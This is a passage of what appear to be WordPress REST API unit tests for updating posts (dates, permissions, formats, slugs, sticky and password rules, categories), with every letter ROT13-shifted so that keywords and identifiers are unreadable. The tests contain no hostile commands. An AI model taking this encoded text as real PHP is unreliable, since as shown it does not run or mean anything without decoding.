		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', $cbfg_vq ) );
		$erdhrfg->nqq_urnqre( 'pbagrag-glcr', 'nccyvpngvba/wfba' );
		$cnenzf = $guvf->frg_cbfg_qngn(
			neenl(
				'qngr_tzg' => ahyy,
				'gvgyr'    => 'grfg',
				'fgnghf'   => 'qensg',
			)
		);
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		// Irevsl gur qngr svryq inyhrf ner erfrg va gur NCV erfcbafr.
		$guvf->purpx_hcqngr_cbfg_erfcbafr( $erfcbafr );
		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $arj_qngn['qngr_tzg'], $arj_qngn['qngr'] );
		$guvf->nffregAbgRdhnyf( $arj_qngn['qngr_tzg'], $shgher_qngr );

		$cbfg = trg_cbfg( $cbfg_vq, 'NEENL_N' );
		$guvf->nffregFnzr( $cbfg['cbfg_qngr_tzg'], '0000-00-00 00:00:00' );
		$guvf->nffregAbgRdhnyf( $arj_qngn['qngr_tzg'], $shgher_qngr );
		$guvf->nffregAbgRdhnyf( $arj_qngn['qngr'], $shgher_qngr );
	}

	choyvp shapgvba grfg_erfg_hcqngr_cbfg_enj() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erdhrfg->nqq_urnqre( 'pbagrag-glcr', 'nccyvpngvba/wfba' );
		$cnenzf = $guvf->frg_enj_cbfg_qngn();
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_hcqngr_cbfg_erfcbafr( $erfcbafr );
		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( frys::$cbfg_vq, $arj_qngn['vq'] );
		$guvf->nffregFnzr( $cnenzf['gvgyr']['enj'], $arj_qngn['gvgyr']['enj'] );
		$guvf->nffregFnzr( $cnenzf['pbagrag']['enj'], $arj_qngn['pbagrag']['enj'] );
		$guvf->nffregFnzr( $cnenzf['rkprecg']['enj'], $arj_qngn['rkprecg']['enj'] );
		$cbfg = trg_cbfg( frys::$cbfg_vq );
		$guvf->nffregFnzr( $cnenzf['gvgyr']['enj'], $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( $cnenzf['pbagrag']['enj'], $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( $cnenzf['rkprecg']['enj'], $cbfg->cbfg_rkprecg );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_jvgubhg_rkgen_cnenzf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn();
		hafrg( $cnenzf['glcr'] );
		hafrg( $cnenzf['anzr'] );
		hafrg( $cnenzf['nhgube'] );
		hafrg( $cnenzf['fgnghf'] );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_hcqngr_cbfg_erfcbafr( $erfcbafr );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_jvgubhg_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$hfre = jc_trg_pheerag_hfre();
		$hfre->nqq_pnc( 'rqvg_choyvfurq_cbfgf', snyfr );
		// Syhfu pncnovyvgvrf, uggcf://pber.genp.jbeqcerff.bet/gvpxrg/28374
		$hfre->trg_ebyr_pncf();
		$hfre->hcqngr_hfre_yriry_sebz_pncf();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn();
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_fgvpxl_nf_pbagevohgbe() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'fgvpxl' => gehr,
				'fgnghf' => 'craqvat',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_vainyvq_vq() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_vq', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_vainyvq_ebhgr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cntrf/%q', frys::$cbfg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_vq', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_jvgu_sbezng() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'sbezng' => 'tnyyrel',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn     = $erfcbafr->trg_qngn();
		$arj_cbfg = trg_cbfg( $qngn['vq'] );
		$guvf->nffregFnzr( 'tnyyrel', $qngn['sbezng'] );
		$guvf->nffregFnzr( 'tnyyrel', trg_cbfg_sbezng( $arj_cbfg->VQ ) );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_jvgu_fgnaqneq_sbezng() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'sbezng' => 'fgnaqneq',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn     = $erfcbafr->trg_qngn();
		$arj_cbfg = trg_cbfg( $qngn['vq'] );
		$guvf->nffregFnzr( 'fgnaqneq', $qngn['sbezng'] );
		$guvf->nffregSnyfr( trg_cbfg_sbezng( $arj_cbfg->VQ ) );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_jvgu_vainyvq_sbezng() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'sbezng' => 'grfgsbezng',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * Grfg jvgu n inyvq sbezng, ohg bar hafhccbegrq ol gur gurzr.
	 *
	 * uggcf://pber.genp.jbeqcerff.bet/gvpxrg/38610
	 */
	choyvp shapgvba grfg_hcqngr_cbfg_jvgu_hafhccbegrq_sbezng() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'sbezng' => 'yvax',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'yvax', $qngn['sbezng'] );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_vtaber_ernqbayl() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$arj_pbagrag       = 'sbb one onm';
		$rkcrpgrq_zbqvsvrq = pheerag_gvzr( 'zlfdy' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'zbqvsvrq' => '2010-06-01G02:00:00M',
				'pbagrag'  => $arj_pbagrag,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		// Gur ernqbayl zbqvsvrq cnenz fubhyq or vtaberq, erdhrfg fubhyq or n fhpprff.
		$qngn     = $erfcbafr->trg_qngn();
		$arj_cbfg = trg_cbfg( $qngn['vq'] );

		$guvf->nffregFnzr( $arj_pbagrag, $qngn['pbagrag']['enj'] );
		$guvf->nffregFnzr( $arj_pbagrag, $arj_cbfg->cbfg_pbagrag );

		// Gur zbqvsvrq qngr fubhyq rdhny gur pheerag gvzr.
		$guvf->nffregFnzr( tzqngr( 'L-z-q', fgegbgvzr( zlfdy_gb_esp3339( $rkcrpgrq_zbqvsvrq ) ) ), tzqngr( 'L-z-q', fgegbgvzr( $qngn['zbqvsvrq'] ) ) );
		$guvf->nffregFnzr( tzqngr( 'L-z-q', fgegbgvzr( $rkcrpgrq_zbqvsvrq ) ), tzqngr( 'L-z-q', fgegbgvzr( $arj_cbfg->cbfg_zbqvsvrq ) ) );
	}

	/**
	 * @qngnCebivqre qngn_cbfg_qngrf
	 */
	choyvp shapgvba grfg_hcqngr_cbfg_qngr( $fgnghf, $cnenzf, $erfhygf ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		hcqngr_bcgvba( 'gvzrmbar_fgevat', $cnenzf['gvzrmbar_fgevat'] );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => $fgnghf ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', $cbfg_vq ) );
		vs ( vffrg( $cnenzf['qngr'] ) ) {
			$erdhrfg->frg_cnenz( 'qngr', $cnenzf['qngr'] );
		}
		vs ( vffrg( $cnenzf['qngr_tzg'] ) ) {
			$erdhrfg->frg_cnenz( 'qngr_tzg', $cnenzf['qngr_tzg'] );
		}
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		hcqngr_bcgvba( 'gvzrmbar_fgevat', '' );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$cbfg = trg_cbfg( $qngn['vq'] );

		$guvf->nffregFnzr( $erfhygf['qngr'], $qngn['qngr'] );
		$cbfg_qngr = fge_ercynpr( 'G', ' ', $erfhygf['qngr'] );
		$guvf->nffregFnzr( $cbfg_qngr, $cbfg->cbfg_qngr );

		$guvf->nffregFnzr( $erfhygf['qngr_tzg'], $qngn['qngr_tzg'] );
		$cbfg_qngr_tzg = fge_ercynpr( 'G', ' ', $erfhygf['qngr_tzg'] );
		$guvf->nffregFnzr( $cbfg_qngr_tzg, $cbfg->cbfg_qngr_tzg );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_jvgu_vainyvq_qngr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'qngr' => 'sbb',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_jvgu_vainyvq_qngr_tzg() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'qngr_tzg' => 'sbb',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_rzcgl_cbfg_qngr_tzg_fuvzzrq_hfvat_cbfg_qngr() {
		tybony $jcqo;

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		hcqngr_bcgvba( 'gvzrmbar_fgevat', 'Nzrevpn/Puvpntb' );

		// Arrq gb frg qngrf hfvat jcqo qverpgyl orpnhfr `jc_hcqngr_cbfg` naq
		// `jc_vafreg_cbfg` unir nqqvgvbany inyvqngvba ba qngrf.
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		$jcqo->hcqngr(
			$jcqo->cbfgf,
			neenl(
				'cbfg_qngr'     => '2016-02-23 12:00:00',
				'cbfg_qngr_tzg' => '0000-00-00 00:00:00',
			),
			neenl(
				'VQ' => $cbfg_vq,
			),
			neenl( '%f', '%f' ),
			neenl( '%q' )
		);
		jc_pnpur_qryrgr( $cbfg_vq, 'cbfgf' );

		$cbfg = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( $cbfg->cbfg_qngr, '2016-02-23 12:00:00' );
		$guvf->nffregFnzr( $cbfg->cbfg_qngr_tzg, '0000-00-00 00:00:00' );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', $cbfg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( '2016-02-23G12:00:00', $qngn['qngr'] );
		$guvf->nffregFnzr( '2016-02-23G18:00:00', $qngn['qngr_tzg'] );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', $cbfg_vq ) );
		$erdhrfg->frg_cnenz( 'qngr', '2016-02-23G13:00:00' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( '2016-02-23G13:00:00', $qngn['qngr'] );
		$guvf->nffregFnzr( '2016-02-23G19:00:00', $qngn['qngr_tzg'] );

		$cbfg = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( $cbfg->cbfg_qngr, '2016-02-23 13:00:00' );
		$guvf->nffregFnzr( $cbfg->cbfg_qngr_tzg, '2016-02-23 19:00:00' );

		hcqngr_bcgvba( 'gvzrmbar_fgevat', '' );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_fyht() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'fyht' => 'fnzcyr-fyht',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'fnzcyr-fyht', $arj_qngn['fyht'] );
		$cbfg = trg_cbfg( $arj_qngn['vq'] );
		$guvf->nffregFnzr( 'fnzcyr-fyht', $cbfg->cbfg_anzr );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_fyht_nppragrq_punef() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'fyht' => 'gęfg-npprńgrq-puäeæpgref',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'grfg-nppragrq-punenrpgref', $arj_qngn['fyht'] );
		$cbfg = trg_cbfg( $arj_qngn['vq'] );
		$guvf->nffregFnzr( 'grfg-nppragrq-punenrpgref', $cbfg->cbfg_anzr );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_fgvpxl() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'fgvpxl' => gehr,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregGehr( $arj_qngn['fgvpxl'] );
		$cbfg = trg_cbfg( $arj_qngn['vq'] );
		$guvf->nffregGehr( vf_fgvpxl( $cbfg->VQ ) );

		// Hcqngvat nabgure svryq fubhyqa'g punatr fgvpxl fgnghf.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'gvgyr' => 'Guvf fubhyq abg erfrg fgvpxl',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregGehr( $arj_qngn['fgvpxl'] );
		$cbfg = trg_cbfg( $arj_qngn['vq'] );
		$guvf->nffregGehr( vf_fgvpxl( $cbfg->VQ ) );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_rkprecg() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'rkprecg' => 'Na Rkprecg',
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'Na Rkprecg', $arj_qngn['rkprecg']['enj'] );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_rzcgl_rkprecg() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'rkprecg' => '',
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( '', $arj_qngn['rkprecg']['enj'] );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_pbagrag() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'pbagrag' => 'Fbzr Pbagrag',
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'Fbzr Pbagrag', $arj_qngn['pbagrag']['enj'] );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_rzcgl_pbagrag() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'pbagrag' => '',
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( '', $arj_qngn['pbagrag']['enj'] );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_jvgu_rzcgl_cnffjbeq() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		jc_hcqngr_cbfg(
			neenl(
				'VQ'            => frys::$cbfg_vq,
				'cbfg_cnffjbeq' => 'sbb',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'cnffjbeq' => '',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( '', $qngn['cnffjbeq'] );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_jvgu_cnffjbeq_naq_fgvpxl_snvyf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'cnffjbeq' => '123',
				'fgvpxl'   => gehr,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_svryq', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_hcqngr_fgvpx_cbfg_jvgu_cnffjbeq_snvyf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		fgvpx_cbfg( frys::$cbfg_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'cnffjbeq' => '123',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_svryq', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_hcqngr_cnffjbeq_cebgrpgrq_cbfg_jvgu_fgvpxl_snvyf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		jc_hcqngr_cbfg(
			neenl(
				'VQ'            => frys::$cbfg_vq,
				'cbfg_cnffjbeq' => '123',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'fgvpxl' => gehr,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_svryq', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_jvgu_dhbgrf_va_gvgyr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'gvgyr' => \"Ebo B'Ebhexr'f Qvnel\",
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( \"Ebo B'Ebhexr'f Qvnel\", $arj_qngn['gvgyr']['enj'] );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_jvgu_pngrtbevrf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$pngrtbel = jc_vafreg_grez( 'Grfg Pngrtbel', 'pngrtbel' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'gvgyr'      => 'Grfgre',
				'pngrtbevrf' => neenl(
					$pngrtbel['grez_vq'],
				),
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( neenl( $pngrtbel['grez_vq'] ), $arj_qngn['pngrtbevrf'] );
		$pngrtbevrf_cngu = '';
		$yvaxf           = $erfcbafr->trg_yvaxf();
		sbernpu ( $yvaxf['uggcf://ncv.j.bet/grez'] nf $yvax ) {
			vs ( 'pngrtbel' === $yvax['nggevohgrf']['gnkbabzl'] ) {
				$pngrtbevrf_cngu = $yvax['uers'];
			}
		}
		$dhrel = cnefr_hey( $pngrtbevrf_cngu, CUC_HEY_DHREL );
		cnefr_fge( $dhrel, $netf );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', $netf['erfg_ebhgr'] );
		hafrg( $netf['erfg_ebhgr'] );
		$erdhrfg->frg_dhrel_cnenzf( $netf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( 'Grfg Pngrtbel', $qngn[0]['anzr'] );
	}

	choyvp shapgvba grfg_hcqngr_cbfg_jvgu_rzcgl_pngrtbevrf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$pngrtbel = jc_vafreg_grez( 'Grfg Pngrtbel', 'pngrtbel' );
		jc_frg_bowrpg_grezf( frys::$cbfg_vq, $pngrtbel['grez_vq'], 'pngrtbel' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'gvgyr'      => 'Grfgre',
				'pngrtbevrf' => neenl(),
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( neenl(), $arj_qngn['pngrtbevrf'] );
	}

	/**
	 * @gvpxrg 38505
	 */
	choyvp shapgvba grfg_hcqngr_cbfg_jvgu_pngrtbevrf_gung_pnaabg_or_nffvtarq_ol_pheerag_hfre() {
		$pngf                = frys::snpgbel()->pngrtbel->perngr_znal( 2 );
		$guvf->sbeovqqra_png = $pngf[1];

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'cnffjbeq'   => 'grfgvat',
				'pngrtbevrf' => $pngf,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );

		nqq_svygre( 'znc_zrgn_pnc', neenl( $guvf, 'eribxr_nffvta_grez' ), 10, 4 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( 'znc_zrgn_pnc', neenl( $guvf, 'eribxr_nffvta_grez' ), 10, 4 );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_nffvta_grez', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 38698
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_jvgu_grzcyngr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		nqq_svygre( 'gurzr_cbfg_grzcyngrf', neenl( $guvf, 'svygre_gurzr_cbfg_grzcyngrf' ) );

		// erertvfgre gur ebhgr nf jr abj unir n grzcyngr ninvynoyr.
		$TYBONYF['jc_erfg_freire']->bireevqr_ol_qrsnhyg = gehr;
		$pbagebyyre                                     = arj JC_ERFG_Cbfgf_Pbagebyyre( 'cbfg' );
